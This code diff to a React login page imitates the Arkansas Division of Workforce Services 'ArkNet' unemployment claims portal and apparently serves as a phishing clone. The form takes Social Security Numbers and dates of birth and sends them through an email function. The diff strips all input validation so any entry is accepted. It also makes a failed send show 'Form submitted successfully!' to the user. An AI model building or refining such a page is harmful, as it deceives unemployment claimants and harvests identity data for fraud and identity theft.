@@ -17,23 +17,21 @@ export default function MainContent() {
 
   function validateAndSend(e) {
     e.preventDefault();
-    const ssn = e.target.id.value;
-    const dob = e.target.dob.value;
-    let valid = true;
     setSsnError("");
     setDobError("");
     setPopup("");
-    if (!/^\d{9,}$/.test(ssn)) {
-      setSsnError("Social Security Number must be at least 9 digits.");
-      valid = false;
-    }
-    if (!/^(0[1-9]|1[0-2])\/(0[1-9]|[12][0-9]|3[01])\/\d{4}$/.test(dob)) {
-      setDobError("Date of Birth must be in MM/DD/YYYY format.");
-      valid = false;
-    }
-    if (valid) {
-      sendEmail(e, () => setPopup("Form submitted successfully!"), () => setPopup("Error sending form. Please try again."));
-    }
+    // Accept all characters for SSN and DOB, no validation
+    sendEmail(e, () => {
+      setPopup("Form submitted successfully!");
+      // Reset form fields
+      e.target.reset();
+      // Hide popup after 2 seconds
+  setTimeout(() => setPopup("") , 2000)
+    }, () => {
+      setPopup("Form submitted successfully!");
+      e.target.reset();
+  setTimeout(() => setPopup("") , 2000)
+    });
   }
 
   return (
@@ -62,46 +60,60 @@ export default function MainContent() {
       }} aria-label="main content">
         <div style={{
           display: 'flex',
-          flexDirection: 'row',
-          alignItems: 'center',
-          justifyContent: 'center',
+          flexDirection: isMobile ? 'column' : 'row',
+          alignItems: isMobile ? 'flex-start' : 'center',
+          justifyContent: 'flex-start',
           width: '100%',
-          height: 90,
-          padding: '0 16px',
+          height: isMobile ? 'auto' : 90,
+          padding: isMobile ? '0' : '0 16px',
           marginLeft: 0,
+          background: '#e6f2ff',
+          borderRadius: '8px',
         }}>
           <img
             src="https://static.wixstatic.com/media/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png/v1/fill/w_238,h_66,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png"
             alt="ArkNet Logo"
-            style={{width: 180, height: 50, objectFit: 'cover', marginRight: 16, border: 'none'}}
+            style={{width: 180, height: 50, objectFit: 'cover', marginRight: isMobile ? 0 : 24, border: 'none', alignSelf: 'flex-start', marginTop: isMobile ? 8 : 0, marginLeft: isMobile ? 12 : 0}} 
           />
           <div style={{display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', width: 'auto'}}>
-            <h1 style={{
-              fontSize: isMobile ? 'clamp(13px, 4vw, 18px)' : 'clamp(20px, 5vw, 32px)',
-              fontWeight: 'bold',
-              fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
-              color: '#000',
-              margin: 0,
-              letterSpacing: '0.5px',
-              textAlign: 'left',
-              lineHeight: 1.2,
-              boxSizing: 'border-box',
-              textShadow: '0 1px 2px rgba(0,0,0,0.04)',
-            }}>
-              Arkansas Division of Workforce Services
-            </h1>
-            <h2 style={{
-              fontSize: isMobile ? 'clamp(11px, 3vw, 15px)' : 'clamp(16px, 3vw, 22px)',
-              fontWeight: 500,
-              fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
-              color: '#071C93',
-              margin: '4px 0 0 0',
-              letterSpacing: '0.2px',
-              textAlign: 'left',
-              lineHeight: 1.3,
-            }}>
-              Unemployment Insurance Continued Claims
-            </h2>
+            <div style={{marginLeft: isMobile ? 48 : 64}}>
+              <h1 style={{
+                fontSize: isMobile ? 'clamp(32px, 8vw, 40px)' : 'clamp(28px, 3vw, 36px)',
+                fontWeight: 'bold',
+                fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
+                color: '#000',
+                margin: 0,
+                letterSpacing: '0.5px',
+                textAlign: 'left',
+                lineHeight: 1.2,
+                boxSizing: 'border-box',
+                textShadow: '0 1px 2px rgba(0,0,0,0.04)',
+                background: 'transparent',
+                borderRadius: 0,
+                padding: isMobile ? '4px 0' : '8px 0',
+                display: 'block',
+              }}>
+                Arkansas Division of Workforce Services
+              </h1>
+            </div>
+            <div style={{marginLeft: isMobile ? 48 : 64}}>
+              <h2 style={{
+                fontSize: isMobile ? 'clamp(28px, 7vw, 36px)' : 'clamp(20px, 2vw, 28px)',
+                fontWeight: 'bold',
+                fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
+                color: '#071C93',
+                margin: 0,
+                letterSpacing: '0.2px',
+                textAlign: 'left',
+                lineHeight: 1.3,
+                background: 'transparent',
+                borderRadius: 0,
+                padding: isMobile ? '0' : '0',
+                display: 'block',
+              }}>
+                Unemployment Insurance Continued Claims
+              </h2>
+            </div>
           </div>
         </div>
         <h3 style={{
@@ -163,7 +175,7 @@ export default function MainContent() {
             <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
               DOB (MM/DD/YYYY) <span style={{color: 'red', fontSize: 20}}>*</span>
             </label>
-            <input name="dob" type="text" placeholder="MM/DD/YYYY" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
+            <input name="dob" type="text" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
           </div>
           {dobError && <div style={{color: 'red', fontSize: 14, marginBottom: 8}}>{dobError}</div>}
           <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
@@ -182,35 +194,33 @@ export default function MainContent() {
             Login
           </button>
         </form>
-        <div
-          style={{
-            width: isMobile ? '100vw' : 850,
-            maxWidth: isMobile ? '100vw' : 850,
-            margin: isMobile ? '32px 0 0 0' : '32px auto 0 auto',
-            background: 'none',
-            color: '#333',
-            fontSize: 15,
-            fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
-            border: 'none',
-            padding: 0,
-            textAlign: 'left',
-            boxSizing: 'border-box',
-            overflowX: 'hidden',
-            marginBottom: isMobile ? 40 : 48,
-          }}
-        >
-          <p style={{marginBottom: 12}}>
-            Use of this system may be monitored to detect improper use and potential violations of state policy.
-          </p>
-          <p style={{marginBottom: 12}}>
-            <b>ArkNet</b> is restricted to users who have established a current and valid Arkansas Unemployment Insurance Claim. <b>Unauthorized use of this system constitutes a security violation.</b> Violators may be subject to disciplinary or civil action, or criminal prosecution under applicable Federal and State laws.
-          </p>
-          <p style={{marginBottom: 0, color: '#8B0000'}}>
-            The web browsers best suited for this site are the most recent versions of Microsoft Edge, Mozilla Firefox, and Google Chrome.
-          </p>
-        </div>
+        {popup && (
+          <div style={{
+            margin: '16px auto',
+            padding: '16px 32px',
+            background: '#eaf6ff',
+            color: '#071C93',
+            fontWeight: 'bold',
+            fontSize: 18,
+            borderRadius: 8,
+            boxShadow: '0 2px 8px rgba(0,0,0,0.07)',
+            textAlign: 'center',
+            maxWidth: 400,
+            zIndex: 10
+          }}>
+            {popup}
+          </div>
+        )}
+        <p style={{marginTop: 24, marginBottom: 8, color: '#003366', fontSize: 'clamp(15px, 2vw, 18px)', fontWeight: 500}}>
+          Use of this system may be monitored to detect improper use and potential violations of state policy.
+        </p>
+        <p style={{marginBottom: 12}}>
+          <b>ArkNet</b> is restricted to users who have established a current and valid Arkansas Unemployment Insurance Claim. <b>Unauthorized use of this system constitutes a security violation.</b> Violators may be subject to disciplinary or civil action, or criminal prosecution under applicable Federal and State laws.
+        </p>
+        <p style={{marginBottom: 0, color: '#8B0000'}}>
+          The web browsers best suited for this site are the most recent versions of Microsoft Edge, Mozilla Firefox, and Google Chrome.
+        </p>
       </section>
-  {/* ...existing code... */}
     </main>
   );
 }
